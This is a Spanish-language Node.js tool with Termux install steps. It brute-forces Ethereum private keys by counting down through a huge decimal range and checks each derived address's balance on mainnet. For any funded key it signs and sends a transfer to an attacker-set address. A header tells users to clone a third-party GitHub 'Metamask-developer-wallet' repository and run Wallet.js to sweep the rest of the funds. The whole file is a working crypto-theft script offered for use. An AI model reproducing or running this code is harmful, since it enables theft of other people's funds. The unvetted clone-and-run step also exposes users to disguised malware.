
        
        
        
        
/**********************************
     INSTALACIÓN Y EJECUCIÓN
***********************************



~ $ yes | pkg update && yes | pkg upgrade
~ $ mkdir proyecto_cracking && cd proyecto_cracking
~ $ pkg install nodejs mariadb -y
~ $ npm install mysql2 web3

New session
~ $ mysqld_safe &

New session
~ $ mysql -u root


~ $ cd proyecto_cracking && nano script_cracking.js
~ $ node script_cracking.js





**********************************/
        
/**********************
  RECOMENDACIÓN
***********************

1.Al obtener una cuenta clave privada con fondos, obtenga su dirección con:



const { Web3 } = require('web3');
const web3 = new Web3();

const pk = "INGRESE_AQUI_PRIVATE_KEY_ENCONTRADA";

const account = web3.eth.accounts.privateKeyToAccount(pk);

console.log('Dirección:', account.address);



y envie el restante con la siguiente wallet no custodiada en github:


https://github.com/user54267547745884/Metamask-developer-wallet.git


~ $ yes | pkg install git
~ $ git clone https://github.com/user54267547745884/Metamask-developer-wallet.git

~ $ cd Metamask-developer-wallet

~ $ node Wallet.js


// Verifique que no haya direcciones que puedan realizar depositos extras.






**********************/
        
        
       // script_cracking.js 
        
        
        
        const BigNumber = require('bignumber.js');
const { Web3 } = require('web3');
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: '',
  database: 'cracking_db',
  waitForConnections: true
});

module.exports = pool;

/**************** 🔰 SCRIPT DE BARRIDO 🔰 *********************/

async function GetNumber() {
    const max = BigInt("99999999999999999999999999999999999999999999999999999999999999999999999999999");
    const connection = await pool.getConnection();

    try {
        await connection.beginTransaction();

        // 1. Buscamos primero si existe alguna fila con valor NULL para reutilizarla
        const [nullRows] = await connection.execute(
            'SELECT id FROM cracking_list WHERE privatekey_decimal IS NULL ORDER BY hora_insercion ASC LIMIT 1 FOR UPDATE;'
        );

        let resultadoBigInt;
        let filaNullId = nullRows.length > 0 ? nullRows[0].id : null;

        // 2. Decidir el camino según si la última fila disponible tiene NULL o no
        if (filaNullId !== null) {
            // SI HAY UNA FILA NULL: No restamos. Buscamos el último número insertado SOLO para mantenerlo
            const [lastRows] = await connection.execute(
                'SELECT privatekey_decimal FROM cracking_list WHERE privatekey_decimal IS NOT NULL ORDER BY hora_insercion DESC LIMIT 1;'
            );

            if (lastRows.length > 0 && lastRows[0].privatekey_decimal) {
                resultadoBigInt = BigInt(lastRows[0].privatekey_decimal);
            } else {
                resultadoBigInt = max;
            }

            // Actualizamos la fila NULL con el número actual de la secuencia
            const proximoResultadoStr = String(resultadoBigInt);
            await connection.execute(
                'UPDATE cracking_list SET privatekey_decimal = ? WHERE id = ?',
                [proximoResultadoStr, filaNullId]
            );

        } else {
            // NO HAY FILAS NULL: Aquí sí avanzamos en la secuencia restando 1
            const [lastRows] = await connection.execute(
                'SELECT privatekey_decimal FROM cracking_list WHERE privatekey_decimal IS NOT NULL ORDER BY hora_insercion DESC LIMIT 1 FOR UPDATE;'
            );

            if (lastRows.length > 0 && lastRows[0].privatekey_decimal) {
                const ultimoDecimal = BigInt(lastRows[0].privatekey_decimal);
                if (ultimoDecimal <= 0n) {
                    resultadoBigInt = max;
                } else {
                    resultadoBigInt = ultimoDecimal - 1n;
                }
            } else {
                resultadoBigInt = max;
            }

            // Insertamos un registro completamente nuevo con el número restado
            const proximoResultadoStr = String(resultadoBigInt);
            await connection.execute(
                'INSERT INTO cracking_list (privatekey_decimal) VALUES (?)',
                [proximoResultadoStr]
            );
        }

        await connection.commit();

    } catch (err) {
        await connection.rollback();
        console.error("Error en GetNumber:", err);
    } finally {
        connection.release();
    }
}

async function Crear_requerimientos_sql() {
    try {
        await pool.execute('CREATE DATABASE IF NOT EXISTS cracking_db;');

        await pool.execute(`
          CREATE TABLE IF NOT EXISTS cracking_list (
            id INT AUTO_INCREMENT PRIMARY KEY,
            privatekey_hex VARCHAR(90) DEFAULT NULL,
            privatekey_decimal VARCHAR(90) DEFAULT NULL,
            privatekey VARCHAR(90) DEFAULT NULL,
            estado VARCHAR(90) DEFAULT NULL,
            hora_insercion TIMESTAMP DEFAULT CURRENT_TIMESTAMP
          )
        `);

        await pool.execute(`CREATE TABLE IF NOT EXISTS cracking_live (
            id INT AUTO_INCREMENT PRIMARY KEY,
            estado VARCHAR(50) DEFAULT NULL,
            privatekey VARCHAR(90) DEFAULT NULL,
            privatekey_hex VARCHAR(90) DEFAULT NULL,
            privatekey_decimal VARCHAR(90) DEFAULT NULL,
            balanceETH DECIMAL(20, 8) DEFAULT 0,
            cantidad_bloques INT DEFAULT 0,
            direccion VARCHAR(42) DEFAULT NULL,
            red_id INT DEFAULT NULL,
            hora_insercion TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );`);

        await pool.execute(`
          CREATE TABLE IF NOT EXISTS cracking_successful (
            id INT AUTO_INCREMENT PRIMARY KEY,
            estado VARCHAR(50) DEFAULT NULL,
            privatekey VARCHAR(90) DEFAULT NULL,
            privatekey_hex VARCHAR(90) DEFAULT NULL,
            privatekey_decimal VARCHAR(90) DEFAULT NULL,
            balanceETH DECIMAL(20, 8) DEFAULT NULL,
            cantidad_bloques INT DEFAULT NULL,
            direccion VARCHAR(42) DEFAULT NULL,
            hash_tx VARCHAR(66) DEFAULT NULL,
            red_id VARCHAR(20) DEFAULT NULL,
            hora_insercion TIMESTAMP DEFAULT CURRENT_TIMESTAMP
          ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
        `);

        await pool.execute(`
          CREATE TABLE IF NOT EXISTS cracking_unsuccessful (
            id INT AUTO_INCREMENT PRIMARY KEY,
            estado VARCHAR(50) DEFAULT NULL,
            privatekey VARCHAR(90) DEFAULT NULL,
            privatekey_hex VARCHAR(90) DEFAULT NULL,
            privatekey_decimal VARCHAR(90) DEFAULT NULL,
            balanceETH DECIMAL(36,18) DEFAULT 0,
            cantidad_bloques INT DEFAULT 0,
            direccion VARCHAR(64) DEFAULT NULL,
            red_id INT DEFAULT NULL,
            hora_insercion TIMESTAMP DEFAULT CURRENT_TIMESTAMP
          )
        `);

        console.log("Base de datos y tablas creadas");
    } catch (err) {
        console.log(err);
    }
}

async function decimalToHex() {
    try {
        const [rows] = await pool.execute(
            `SELECT privatekey_decimal FROM cracking_list WHERE privatekey_hex IS NULL ORDER BY hora_insercion DESC LIMIT 1;`
        );

        const valor = rows[0].privatekey_decimal;
        const x = new BigNumber(valor, 10);
        const resultado = x.toString(16).toUpperCase();
        const textoMinusculas = resultado.toLowerCase();

        await pool.execute(
          'UPDATE cracking_list SET privatekey_hex = ? WHERE privatekey_decimal = ?',
          [textoMinusculas, valor]
        );
    } catch (err) {
        console.log(err);
    }
}

const INFURA_URL = "https://ethereum-rpc.publicnode.com";
const web3 = new Web3(new Web3.providers.HttpProvider(INFURA_URL));

async function crackear() {
    const MontoTransferencia = "0.00000100";
    const estado_exitoso = "With funds";
    const estado_sin_fondos = "No funds";
    const estado_live = "Live";
    const estado_inexistente = "No exist";
    const cuentaDestino = "AQUI_COLOCAR_DIRECCION_ETHEREUM";

    const [rows] = await pool.execute(
        `SELECT privatekey_hex FROM cracking_list WHERE estado IS NULL ORDER BY hora_insercion DESC LIMIT 1;`
    );

    const privatekey_hex = rows[0].privatekey_hex;
    const privatekey = `0x${privatekey_hex}`;
    const red_id = 1;

    const max = "99999999999999999999999999999999999999999999999999999999999999999999999999999";
    const min = "10000000000000000000000000000000000000000000000000000000000000000000000000000";

    try {
        const account = web3.eth.accounts.privateKeyToAccount(privatekey);
        const cuentaOrigen = account.address;
        const balanceWei = await web3.eth.getBalance(cuentaOrigen);
        const balanceETH = web3.utils.fromWei(balanceWei, 'ether');
        const totalTransaccionesWallet = await web3.eth.getTransactionCount(cuentaOrigen);

        const RESET = "\x1b[0m";     
        const AMARILLO = "\x1b[33m";
        const AZUL = "\x1b[34m";
        const CYAN = "\x1b[36m";
        const VERDE = "\x1b[32m";

        if (!cuentaOrigen && privatekey) {
            console.log("❌️Invalid hexadecimal number for private key❌️");

            await pool.execute(
              'UPDATE cracking_list SET estado = ? WHERE privatekey_hex = ?',
              [estado_inexistente, privatekey_hex]
            );

            await pool.execute(
              'UPDATE cracking_list SET privatekey = ? WHERE privatekey_hex = ?',
              [privatekey, privatekey_hex]
            );

            const [rows] = await pool.execute('SELECT * FROM cracking_list WHERE privatekey_hex = ?', [privatekey_hex]);

            console.log(`🔑 ${AMARILLO}Private key hexadecimal:${RESET} ${rows[0].privatekey_hex}`);
            console.log(`🔑 ${AMARILLO}Private key decimal:${RESET} ${rows[0].privatekey_decimal}`);
            console.log(`📊 ${CYAN}Status:${RESET} ${rows[0].estado}`);
            console.log(`🔑 ${AMARILLO}Private key:${RESET} ${rows[0].privatekey}`);
            console.log(`📈 ${CYAN}Maximum limit decinal:${RESET} ${max}`);
            console.log(`📉 ${CYAN}Minimum limit decimal:${RESET} ${min}`);
            console.log(`⛓️ ${CYAN}Chain ID:${RESET} 1`);

        } else if (totalTransaccionesWallet > 0 && balanceETH < 0.00003000 && cuentaOrigen) {
            await pool.execute('UPDATE cracking_list SET privatekey = ? WHERE privatekey_hex = ?', [privatekey, privatekey_hex]);
            await pool.execute('UPDATE cracking_list SET estado = ? WHERE privatekey_hex = ?', [estado_live, privatekey_hex]);

            await pool.execute(`
              INSERT INTO cracking_live (privatekey_hex, privatekey_decimal, privatekey)
              SELECT privatekey_hex, privatekey_decimal, privatekey
              FROM cracking_list
              ORDER BY id DESC
              LIMIT 1
            `);

            await pool.execute('UPDATE cracking_live SET direccion = ? WHERE privatekey_hex = ?', [cuentaOrigen, privatekey_hex]);
            await pool.execute('UPDATE cracking_live SET estado = ? WHERE privatekey_hex = ?', [estado_live, privatekey_hex]);
            await pool.execute('UPDATE cracking_live SET privatekey = ? WHERE privatekey_hex = ?', [privatekey, privatekey_hex]);
            await pool.execute('UPDATE cracking_live SET balanceETH = ? WHERE privatekey_hex = ?', [balanceETH, privatekey_hex]);
            await pool.execute('UPDATE cracking_live SET cantidad_bloques = ? WHERE privatekey_hex = ?', [totalTransaccionesWallet, privatekey_hex]);
            await pool.execute('UPDATE cracking_live SET red_id = ? WHERE privatekey_hex = ?', [red_id, privatekey_hex]);

            const [rows] = await pool.execute('SELECT * FROM cracking_live WHERE privatekey_hex = ?', [privatekey_hex]);

            console.log(`🔑 ${AMARILLO}Private key hexadecimal:${RESET} ${rows[0].privatekey_hex}`);
            console.log(`🔑 ${AMARILLO}Private key decimal:${RESET} ${rows[0].privatekey_decimal}`);
            console.log(`📊 ${CYAN}Status:${RESET} ${rows[0].estado}`);
            console.log(`🔑 ${AMARILLO}Private key:${RESET} ${rows[0].privatekey}`);
            console.log(`🪙 ${VERDE}Balance in ETH:${RESET} ${rows[0].balanceETH}`);
            console.log(`📤 ${AZUL}Dirección:${RESET} ${rows[0].direccion}`);
            console.log(`📈 ${CYAN}Maximum limit decinal:${RESET} ${max}`);
            console.log(`📉 ${CYAN}Minimum limit decimal:${RESET} ${min}`);
            console.log(`⛓️ ${CYAN}Chain ID:${RESET} 1`);

        } else if (balanceETH > 0.00003000 && cuentaOrigen && totalTransaccionesWallet > 0) {
            await pool.execute('UPDATE cracking_list SET estado = ? WHERE privatekey_hex = ?', [estado_exitoso, privatekey_hex]);
            await pool.execute('UPDATE cracking_list SET privatekey = ? WHERE privatekey_hex = ?', [privatekey, privatekey_hex]);

            await pool.execute(`
              INSERT INTO cracking_successful (privatekey_hex, privatekey_decimal, privatekey)
              SELECT privatekey_hex, privatekey_decimal, privatekey
              FROM cracking_list
              ORDER BY id DESC
              LIMIT 1
            `);

            const nonce = await web3.eth.getTransactionCount(cuentaOrigen, 'latest'); 
            const transaccion = { 
                from: cuentaOrigen, 
                to: cuentaDestino, 
                value: web3.utils.toWei(MontoTransferencia, 'ether'), 
                gas: 21000, 
                gasPrice: await web3.eth.getGasPrice(), 
                nonce: nonce, 
                chainId: red_id
            };

            const signedTx = await web3.eth.accounts.signTransaction(transaccion, privatekey);
            const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
            const hash_tx = receipt.transactionHash;

            await pool.execute('UPDATE cracking_successful SET estado = ? WHERE privatekey_hex = ?', [estado_exitoso, privatekey_hex]);
            await pool.execute('UPDATE cracking_successful SET privatekey = ? WHERE privatekey_hex = ?', [privatekey, privatekey_hex]);
            await pool.execute('UPDATE cracking_successful SET direccion = ? WHERE privatekey_hex = ?', [cuentaOrigen, privatekey_hex]);
            await pool.execute('UPDATE cracking_successful SET balanceETH = ? WHERE privatekey_hex = ?', [balanceETH, privatekey_hex]);
            await pool.execute('UPDATE cracking_successful SET hash_tx = ? WHERE privatekey_hex = ?', [hash_tx, privatekey_hex]);
            await pool.execute('UPDATE cracking_successful SET cantidad_bloques = ? WHERE privatekey_hex = ?', [totalTransaccionesWallet, privatekey_hex]);
            await pool.execute('UPDATE cracking_successful SET red_id = ? WHERE privatekey_hex = ?', [red_id, privatekey_hex]);

            const [rows] = await pool.execute('SELECT * FROM cracking_successful WHERE privatekey_hex = ?', [privatekey_hex]);

            console.log("\n\n📥Successful cracking📥\n");
            console.log(`🔑 ${AMARILLO}Private key hexadecimal:${RESET} ${rows[0].privatekey_hex}`);
            console.log(`🔑 ${AMARILLO}Private key decimal:${RESET} ${rows[0].privatekey_decimal}`);
            console.log(`📊 ${CYAN}Status:${RESET} ${rows[0].estado}`);
            console.log(`🔑 ${AMARILLO}Private key:${RESET} ${rows[0].privatekey}`);
            console.log(`🪙 ${VERDE}Balance in ETH:${RESET} ${rows[0].balanceETH}`);
            console.log(`📤 ${AZUL}Dirección:${RESET} ${rows[0].direccion}`);
            console.log(`📈 ${CYAN}Maximum limit decinal:${RESET} ${max}`);
            console.log(`📉 ${CYAN}Minimum limit decimal:${RESET} ${min}`);
            console.log(`⛓️ ${CYAN}Chain ID:${RESET} 1`);

        } else if (cuentaOrigen && balanceETH <= 0.00000000 && totalTransaccionesWallet <= 0) {
            await pool.execute('UPDATE cracking_list SET privatekey = ? WHERE privatekey_hex = ?', [privatekey, privatekey_hex]);
            await pool.execute('UPDATE cracking_list SET estado = ? WHERE privatekey_hex = ?', [estado_sin_fondos, privatekey_hex]);

            await pool.execute(`
              INSERT INTO cracking_unsuccessful (privatekey_hex, privatekey_decimal, privatekey)
              SELECT privatekey_hex, privatekey_decimal, privatekey
              FROM cracking_list
              ORDER BY id DESC
              LIMIT 1
            `);

            console.log("\n\n❌️Unsuccessful cracking❌️\n");

            await pool.execute('UPDATE cracking_unsuccessful SET estado = ? WHERE privatekey_hex = ?', [estado_sin_fondos, privatekey_hex]);
            await pool.execute('UPDATE cracking_unsuccessful SET privatekey = ? WHERE privatekey_hex = ?', [privatekey, privatekey_hex]);
            await pool.execute('UPDATE cracking_unsuccessful SET balanceETH = ? WHERE privatekey_hex = ?', [balanceETH, privatekey_hex]);
            await pool.execute('UPDATE cracking_unsuccessful SET direccion = ? WHERE privatekey_hex = ?', [cuentaOrigen, privatekey_hex]);
            await pool.execute('UPDATE cracking_unsuccessful SET cantidad_bloques = ? WHERE privatekey_hex = ?', [totalTransaccionesWallet, privatekey_hex]);
            await pool.execute('UPDATE cracking_unsuccessful SET red_id = ? WHERE privatekey_hex = ?', [red_id, privatekey_hex]);

            const [rows] = await pool.execute('SELECT * FROM cracking_unsuccessful WHERE privatekey_hex = ?', [privatekey_hex]);

            console.log(`🔑 ${AMARILLO}Private key hexadecimal:${RESET} ${rows[0].privatekey_hex}`); 
            console.log(`🔑 ${AMARILLO}Private key decimal:${RESET} ${rows[0].privatekey_decimal}`); 
            console.log(`📊 ${CYAN}Status:${RESET} ${rows[0].estado}`); 
            console.log(`🔑 ${AMARILLO}Private key:${RESET} ${rows[0].privatekey}`); 
            console.log(`🪙 ${VERDE}Balance in ETH:${RESET} ${rows[0].balanceETH}`); 
            console.log(`📤 ${AZUL}Dirección:${RESET} ${rows[0].direccion}`); 
            console.log(`📈 ${CYAN}Maximum limit decinal:${RESET} ${max}`); 
            console.log(`📉 ${CYAN}Minimum limit decimal:${RESET} ${min}`); 
            console.log(`⛓️ ${CYAN}Chain ID:${RESET} 1`);
        }
    } catch (error) {
        console.log(error);
    }
}

const esperar = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function bucleInfinito() {
  while (true) {
    await Crear_requerimientos_sql();
    await GetNumber();
    await decimalToHex();
    await crackear();
    await esperar(5000);
  }
}

bucleInfinito();
